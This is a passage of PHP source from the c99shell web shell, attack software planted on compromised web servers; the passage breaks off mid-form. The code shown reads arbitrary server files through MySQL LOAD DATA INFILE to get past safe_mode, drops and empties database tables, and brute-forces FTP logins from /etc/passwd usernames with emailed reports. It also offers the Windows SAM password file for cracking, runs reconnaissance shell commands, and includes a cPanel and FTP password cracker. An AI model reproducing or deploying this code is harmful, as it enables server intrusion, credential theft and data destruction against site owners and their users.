								<input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\">
								<b>From:</b> <input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\"> 
								<b>To:</b> <input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\"> 
								<input type=\"submit\" value=\"View\"></form>";
								echo "<br><form method=\"POST\"><TABLE cellSpacing=0  cellPadding=5 width=\"1%\"   border=1>";
								echo "<tr>";
								echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>";
								for ($i=0;$i<mysql_num_fields($result);$i++)
								{
									$v = mysql_field_name($result,$i);
									if ($e[0] == "a") {$s = "d"; $m = "asc";}
									else {$s = "a"; $m = "desc";}
									echo "<td>";
									if (empty($e[0])) {$e[0] = "a";}
									if ($e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}
									else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\">
									<img src=\"".$surl."act=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"></a>";}
									echo "</td>";
								}
								echo "<td><font color=\"#00ff00\"><b>Action</b></font></td>";
								echo "</tr>";
								while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
								{
									echo "<tr>";
									$w = "";
									$i = 0;
									foreach ($row as $k=>$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
									if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);}
									echo "<td><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";
									$i = 0;
									foreach ($row as $k=>$v)
									{
						        $v = htmlspecialchars($v);
						        if ($v == "") {$v = "<font color=\"#00ff00\">NULL</font>";}
						        echo "<td>".$v."</td>";
										$i++;
									}
									echo "<td>";
									echo "<a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\">Delete</a> ";
									echo "<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\">Edit</a> ";
									echo "</td>";
									echo "</tr>";
								}
								mysql_free_result($result);
								echo "</table><hr size=\"1\" noshade><p align=\"left\">-^^-<select name=\"sql_act\">";
								echo "<option value=\"\">With selected:</option>";
								echo "<option value=\"deleterow\">Delete</option>";
								echo "</select> <input type=\"submit\" value=\"Confirm\"></form></p>";
							}
						}
						else
						{
							$result = mysql_query("SHOW TABLE STATUS", $sql_sock);
							if (!$result) {echo mysql_smarterror();}
							else
							{
					      echo "<br><form method=\"POST\">
								<TABLE cellSpacing=0 cellPadding=5 width=\"100%\" border=1><tr>
								<td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td>
								<td><center><b>Table</b></center></td><td><b>Rows</b></td>
								<td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td>
								<td><b>Size</b></td><td><b>Action</b></td></tr>";
					      $i = 0;
					      $tsize = $trows = 0;
					      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
					      {
									$tsize += $row["Data_length"];
									$trows += $row["Rows"];
									$size = view_size($row["Data_length"]);
									echo "<tr>";
									echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"></td>";
									echo "<td> <a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"><b>".$row["Name"]."</b></a> </td>";
									echo "<td>".$row["Rows"]."</td>";
									echo "<td>".$row["Type"]."</td>";
									echo "<td>".$row["Create_time"]."</td>";
									echo "<td>".$row["Update_time"]."</td>";
									echo "<td>".$size."</td>";
									echo "<td> <a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\">Empty</a> | <a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\">Drop</a> | <a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\">Insert</a> </td>";
									echo "</tr>";
									$i++;
					      }
					      echo "<tr bgcolor=\"000000\">";
					      echo "<td><center><b>?</b></center></td>";
					      echo "<td><center><b>".$i." table(s)</b></center></td>";
					      echo "<td><b>".$trows."</b></td>";
					      echo "<td>".$row[1]."</td>";
					      echo "<td>".$row[10]."</td>";
					      echo "<td>".$row[11]."</td>";
					      echo "<td><b>".view_size($tsize)."</b></td>";
					      echo "<td></td>";
					      echo "</tr>";
					      echo "</table><hr size=\"1\" noshade><p align=\"right\">-^^-<select name=\"sql_act\">";
					      echo "<option value=\"\">With selected:</option>";
					      echo "<option value=\"tbldrop\">Drop</option>";
					      echo "<option value=\"tblempty\">Empty</option>";
					      echo "<option value=\"tbldump\">Dump</option>";
					      echo "<option value=\"tblcheck\">Check table</option>";
					      echo "<option value=\"tbloptimize\">Optimize table</option>";
					      echo "<option value=\"tblrepair\">Repair table</option>";
					      echo "<option value=\"tblanalyze\">Analyze table</option>";
					      echo "</select> <input type=\"submit\" value=\"Confirm\"></form></p>";
								mysql_free_result($result);
							}
						}
					}
				}
			}
			else
			{
				$acts = array("","newdb","serverstatus","servervars","processes","getfile");
				if (in_array($sql_act,$acts)) 
				{
					?>
					<table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b>
					<form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql">
					<input type="hidden" name="sql_act" value="newdb">
					<input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
					<input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
					<input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">
					<input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">
					<input type="text" name="sql_newdb" size="20"> <input type="submit" value="Create"></form></td>
					<td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>">
					<input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile">
					<input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
					<input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
					<input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">
					<input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">
					<input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>"> 
					<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr>
					<tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr>
					</table>
					<?php 
				}
				if (!empty($sql_act))
				{
					echo "<hr size=\"1\" noshade>";
					if ($sql_act == "newdb")
					{
						echo "<b>";
						if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
						else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
					}
					if ($sql_act == "serverstatus")
					{
						$result = mysql_query("SHOW STATUS", $sql_sock);
						echo "<center><b>Server-status variables:</b><br><br>";
						echo "<TABLE cellSpacing=0 cellPadding=0  borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
						while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
						echo "</table></center>";
						mysql_free_result($result);
					}
					if ($sql_act == "servervars")
					{
						$result = mysql_query("SHOW VARIABLES", $sql_sock);
						echo "<center><b>Server variables:</b><br><br>";
						echo "<TABLE cellSpacing=0 cellPadding=0  borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
						while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
						echo "</table>";
						mysql_free_result($result);
					}
				
					if ($sql_act == "processes")
					{
						if (!empty($kill)) {$query = "KILL ".$kill.";"; $result = mysql_query($query, $sql_sock); echo "<b>Killing process #".$kill."... ok. he is dead, amen.</b>";}
						$result = mysql_query("SHOW PROCESSLIST", $sql_sock);
						echo "<center><b>Processes:\t</b><br><br>";
						echo "<TABLE cellSpacing=0 cellPadding=2  borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
						while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
						echo "</table>";
						mysql_free_result($result);
					}
					if ($sql_act == "getfile")
					{
						$tmpdb = $sql_login."_tmpdb";
						$select = mysql_select_db($tmpdb);
						if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
						if ($select)
						{
							$created = FALSE;
							mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
							mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
							$result = mysql_query("SELECT * FROM tmp_file;");
							if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
							else
							{
								for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
								$f = "";
								while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
								if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
								else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
								mysql_free_result($result);
								mysql_query("DROP TABLE tmp_file;");
							}
						}
						mysql_drop_db($tmpdb); //comment it if you want to leave database
					}
				}
			}
		}
		echo "</td></tr></table>";
		if ($sql_sock)
		{
			$affected = @mysql_affected_rows($sql_sock);
			if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;}
			echo "<tr><td><center><b>Affected rows: ".$affected."</center></td></tr>";
		}
		echo "</table>";
	}
	if ($act == "mkdir")
	{
		if ($mkdir != $d)
		{
			if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object al#ff0000y exists";}
			elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";}
			echo "<br><br>";
		}
		$act = $dspact = "ls";
	}
	if ($act == "ftpquickbrute")
	{
		echo "<b>Ftp Quick brute:</b><br>";
		if (!win) {echo "This functions not work in Windows!<br><br>";}
		else
		{
			function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
			{
				if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array("/bin/FALSE","/sbin/nologin")));}
				else {$TRUE = TRUE;}
				if ($TRUE)
				{
					$sock = @ftp_connect($host,$port,$timeout);
					if (@ftp_login($sock,$login,$pass))
					{
						echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\">
						<b>Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"</b></a>.<br>";
						ob_flush();
						return TRUE;
					}
				}
			}
			if (!empty($submit))
			{
				if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
				$fp = fopen("/etc/passwd","r");
				if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
				else
				{
					if ($fqb_logging)
					{
						if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");}
						else {$fqb_logfp = FALSE;}
						$fqb_log = "FTP Quick Brute (called c99shell v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
						if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
					}
					ob_flush();
					$i = $success = 0;
					$ftpquick_st = getmicrotime();
					while(!feof($fp))
					{
						$str = explode(":",fgets($fp,2048));
						if (c99ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
						{
							echo "<b>Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"</b><br>";
							$fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n";
							if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
							$success++;
							ob_flush();
						}
			     if ($i > $fqb_lenght) {break;}
			     $i++;
					}
					if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!\r\n";}
					$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
					echo "<hr size=\"1\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>
					Total connections: ".$i."<br>Success.: <font color=#00ff00><b>".$success."</b></font><br>
					Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>";
					$fqb_log .= "\r\n------------------------------------------\r\nDone!\r\nTotal time (secs.): ".$ftpquick_t."\r\nTotal connections: ".$i."\r\nSuccess.: ".$success."\r\nUnsuccess.:".($i-$success)."\r\nConnects per second: ".round($i/$ftpquick_t,2)."\r\n";
					if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
					if ($fqb_logemail) {@mail($fqb_logemail,"c99shell v. ".$shver." report",$fqb_log);}
					fclose($fqb_logfp);
				}
			}
			else
			{
				$logfile = $tmpdir_logs."c99sh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
				$logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);
				echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"ftpquickbrute\"><br>
				Read first: <input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"><br><br>
				Users only with shell? <input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"><br><br>
				Logging? <input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked><br>
				Logging to file? <input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"><br>
				Logging to e-mail? <input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"><br><br>
				<input type=submit name=submit value=\"Brute\"></form>";
			}
		}
	}
	if ($act == "d")
	{
		if (!is_dir($d)) {echo "<center><b>Permision denied!</b></center>";}
		else
		{
			echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";
			if (!$win)
			{
				echo "<tr><td><b>Owner/Group</b></td><td> ";
				$ow = posix_getpwuid(fileowner($d));
				$gr = posix_getgrgid(filegroup($d));
				$row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));
			}
			echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>";
		}
	}
	if ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();}
	if ($act == "security") {
  echo "<div class=barheader>.: Server Security Information :.</div>".
       "<table>".
       "<tr><td>Open Base Dir</td><td>".$hopenbasedir."</td></tr>";
  echo "<td>Password File</td><td>";
  if (!$win) {
    if ($nixpasswd) {
      if ($nixpasswd == 1) {$nixpasswd = 0;}
      echo "*nix /etc/passwd:<br>";
      if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
      if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}
      echo "<form action=\"".$surl."\"><input type=hidden name=x value=\"security\"><input type=hidden name=\"nixpasswd\" value=\"1\"><b>From:</b>&nbsp;<input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\">&nbsp;<input type=submit value=\"View\"></form><br>";
      $i = $nixpwd_s;
      while ($i < $nixpwd_e) {
        $uid = posix_getpwuid($i);
        if ($uid) {
          $uid["dir"] = "<a href=\"".$surl."x=ls&d=".urlencode($uid["dir"])."\">".$uid["dir"]."</a>";
          echo join(":",$uid)."<br>";
        }
        $i++;
      }
    }
    else {echo "<a href=\"".$surl."x=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a>";}
  }
  else {
    $v = $_SERVER["WINDIR"]."\repair\sam";
    if (file_get_contents($v)) {echo "<td colspan=2><div class=fxerrmsg>You can't crack Windows passwords(".$v.")</div></td></tr>"; }
    else {echo "You can crack Windows passwords. <a href=\"".$surl."x=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ?.</td></tr>";}
  }
  echo "</td></tr>";
  echo "<tr><td>Config Files</td><td>";
  if (!$win) {
    $v = array(
        array("User Domains","/etc/userdomains"),
        array("Cpanel Config","/var/cpanel/accounting.log"),
        array("Apache Config","/usr/local/apache/conf/httpd.conf"),
        array("Apache Config","/etc/httpd.conf"),
        array("Syslog Config","/etc/syslog.conf"),
        array("Message of The Day","/etc/motd"),
        array("Hosts","/etc/hosts")
    );
    $sep = "/";
  }
  else {
    $windir = $_SERVER["WINDIR"];
    $etcdir = $windir . "\system32\drivers\etc\\";
    $v = array(
        array("Hosts",$etcdir."hosts"),
        array("Local Network Map",$etcdir."networks"),
        array("LM Hosts",$etcdir."lmhosts.sam"),
    );
    $sep = "\\";
  }
  foreach ($v as $sec_arr) {
    $sec_f = substr(strrchr($sec_arr[1], $sep), 1);
    $sec_d = rtrim($sec_arr[1],$sec_f);
    $sec_full = $sec_d.$sec_f;
    $sec_d = rtrim($sec_d,$sep);
    if (file_get_contents($sec_full)) {
      echo " [ <a href=\"".$surl."x=f&f=$sec_f&d=".urlencode($sec_d)."&ft=txt\"><u><b>".$sec_arr[0]."</b></u></a> ] ";
    }
  }
  echo "</td></tr>";

  function displaysecinfo($name,$value) {
    if (!empty($value)) {
      echo "<tr><td>".$name."</td><td><pre>".wordwrap($value,100)."</pre></td></tr>";
    }
  }
  if (!$win) {
    displaysecinfo("OS Version",myshellexec("cat /proc/version"));
    displaysecinfo("Kernel Version",myshellexec("sysctl -a | grep version"));
    displaysecinfo("Distrib Name",myshellexec("cat /etc/issue.net"));
    displaysecinfo("Distrib Name (2)",myshellexec("cat /etc/*-realise"));
    displaysecinfo("CPU Info",myshellexec("cat /proc/cpuinfo"));
    displaysecinfo("RAM",myshellexec("free -m"));
    displaysecinfo("HDD Space",myshellexec("df -h"));
    displaysecinfo("List of Attributes",myshellexec("lsattr -a"));
    displaysecinfo("Mount Options",myshellexec("cat /etc/fstab"));
    displaysecinfo("cURL installed?",myshellexec("which curl"));
    displaysecinfo("lynx installed?",myshellexec("which lynx"));
    displaysecinfo("links installed?",myshellexec("which links"));
    displaysecinfo("fetch installed?",myshellexec("which fetch"));
    displaysecinfo("GET installed?",myshellexec("which GET"));
    displaysecinfo("perl installed?",myshellexec("which perl"));
    displaysecinfo("Where is Apache?",myshellexec("whereis apache"));
    displaysecinfo("Where is perl?",myshellexec("whereis perl"));
    displaysecinfo("Locate proftpd.conf",myshellexec("locate proftpd.conf"));
    displaysecinfo("Locate httpd.conf",myshellexec("locate httpd.conf"));
    displaysecinfo("Locate my.conf",myshellexec("locate my.conf"));
    displaysecinfo("Locate psybnc.conf",myshellexec("locate psybnc.conf"));
  }
  else {
    displaysecinfo("OS Version",myshellexec("ver"));
    displaysecinfo("Account Settings",myshellexec("net accounts"));
  }
  echo "</table>\n";
}
	if ($act == "mkfile")
	{
		if ($mkfile != $d)
		{
			if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object al#ff0000y exists";}
			elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied";}
			else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}
		}
		else {$act = $dspact = "ls";}
	}
	if ($act == "encoder")
	{
		echo "<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script>
		<b>Encoder:</b><form name=\"encoder\" action=\"".$surl."\" method=POST>
		<input type=hidden name=act value=encoder><b>Input:</b><br>
		<textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5>".@htmlspecialchars($encoder_input)."</textarea>
		<br><br><input type=submit value=\"calculate\"><br><br><b>Hashes</b>:<br>";
		foreach(array("md5","crypt","sha1","crc32") as $v)
		{
			echo $v." - <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly><br>";
		}
		echo "<b>Url:</b><br>urlencode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly>
		<br>urldecode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".htmlspecialchars(urldecode($encoder_input))."\" readonly>
		<br><b>Base64:</b><br>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly>";
		echo "<br>base64_decode - ";
		if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "<input type=text size=35 value=\"failed\" disabled readonly>";}
		else
		{
			$debase64 = base64_decode($encoder_input);
			$debase64 = str_replace("\0","[0]",$debase64);
			$a = explode("\r\n",$debase64);
			$rows = count($a);
			$debase64 = htmlspecialchars($debase64);
			if ($rows == 1) {echo "<input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly>";}
			else {$rows++; echo "<textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly>".$debase64."</textarea>";}
			echo " <a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"><b>^</b></a>";
		}
		echo "<br><b>Base convertations</b>: <br>dec2hex - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"";
		$c = strlen($encoder_input);
		for($i=0;$i<$c;$i++)
		{
			$hex = dechex(ord($encoder_input[$i]));
			if ($encoder_input[$i] == "&") {echo $encoder_input[$i];}
			elseif ($encoder_input[$i] != "\\") {echo "%".$hex;}
		}
		echo "\" readonly><br></center></form>";
	}
	if ($act == "fsbuff")
	{
		$arr_copy = $sess_data["copy"];
		$arr_cut = $sess_data["cut"];
		$arr = array_merge($arr_copy,$arr_cut);
		if (count($arr) == 0) {echo "<center><b>Buffer is empty!</b></center>";}
		else {echo "<b>File-System buffer</b><br><br>"; $ls_arr = $arr; $disp_fullpath = TRUE; $act = "ls";}
	}
	
	if ($act == "crack"){
  if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="code-security.com"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b>Password is Broken !!</b>");
   }
}
$connect_timeout=100;
set_time_limit(0);
$submit=$_REQUEST['submit'];
$users=$_REQUEST['users'];
$pass=$_REQUEST['passwords'];
$target=$_REQUEST['target'];
$cracktype=$_REQUEST['cracktype'];


if($target == ""){
$target = "localhost";
}
echo '<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
</head>
<body text="#00FF00" bgcolor="#000000" vlink="#008000" link="#008000" alink="#008000">
<div align="center">
<form method="POST" style="border: 1px solid #000000">
<table width="67%" style="border: 2px dashed #1D1D1D; background-color:#000000; color:#FF0000">
<tr><td align=center>
 <font face="Courier New" size=4 color="#FF0000" ><b>Cpanel and FTP Cracker</b></font>
</td></tr>
</table>
<br />';
function ftp_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "ftp://$host");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) { print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
<font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Request Time Out
Please Check The Target Hostname .</font></font></b></p>";exit;}
elseif ( curl_errno($ch) == 0 ){
print "<table width='67%' style='border: 2px dashed #1D1D1D; background-color:; color:#C0C0C0'><tr><td align=center><b><font face=\"Tahoma\" color=\"#FF0000\">[+]</font><font>
Username (</font><font color=\"#FF0000\">$user</font><font>) and Password (</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">)</font></b></td></tr></table>";}curl_close($ch);}
function cpanel_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) { print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
<font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Request Time Out
Please Check The Target Hostname .</font></font></b></p>";exit;}
elseif ( curl_errno($ch) == 0 ){
print "<table width='67%' style='border: 2px dashed #1D1D1D; background-color:#FF0000; color:#C0C0C0'><tr><td align=center><b><font face=\"Tahoma\" color=\"#FF0000\">[+]</font><font>
Username (</font><font color=\"#4c83af\">$user</font><font>) and Password (</font><font color=\"#4c83af\">$pass</font><font color=\"#008000\">)</font></b></td></tr></table>";}curl_close($ch);}
if(isset($submit) && !empty($submit)){
if(empty($users) && empty($pass)){ print "<p><font face=\"Tahoma\" size=\"2\"><b><font color=\"#4c83af\">Error : </font>Please Check The Users or Password List Entry . . .</b></font></p>"; exit; }
if(empty($users)){ print "<p><font face='Tahoma' size='2'><b><font color='#4c83af'>Error : </font>Please Check The Users List Entry . . .</b></font></p>"; exit; }
if(empty($pass) ){ print "<p><font face='Tahoma' size='2'><b><font color='#4c83af'>Error : </font>Please Check The Password List Entry . . .</b></font></p>"; exit; };
$userlist=explode("\n",$users);
$passlist=explode("\n",$pass);
print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#4c83af\">
Cracking Process Started, Please Wait ...</font></b><br><br>";
foreach ($userlist as $user) {
$pureuser = trim($user);
foreach ($passlist as $password ) {
$purepass = trim($password);
if($cracktype == "ftp"){
ftp_check($target,$pureuser,$purepass,$connect_timeout);
}
if ($cracktype == "cpanel")
{
cpanel_check($target,$pureuser,$purepass,$connect_timeout);
}
}
}
}

                            if($_POST['enter']){
echo "<form method=POST action=''><table width='67%' style='border: 2px dashed #1D1D1D; background-color:#000000; color:#C0C0C0'>
                <tr>
                        <td> <br />
        <p align='center'><b><font color='#4c83af'>
                <span lang='en-us'>Server's IP</span> :</font><font face='Arial'>
        </font><font face='Arial' color='#CC0000'>
        <input type='text' name='target' size='16' value=$target style='border: 2px dashed #1D1D1D; background-color: #000000; color:#4c83af'></font></b></p>
        <p align='center'><b><font color='#008000' face='Tahoma' size='2'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></b></p>
                        <div align='center'>
                                <table width='55%' style='border: 2px dashed #1D1D1D; background-color:#FF0000; color:#C0C0C0'>
                                        <tr>
                                                <td align='center'>
                                                                                                <span lang='en-us'><font color='#4c83af'><b>Username</b></font></span></td>
                                                <td>
                                                <p align='center'>
                                                                                                <span lang='en-us'><font color='#4c83af'><b>Password</b></font></span></td>
                                        </tr>
                                </table>
						<p align='center'>&nbsp;
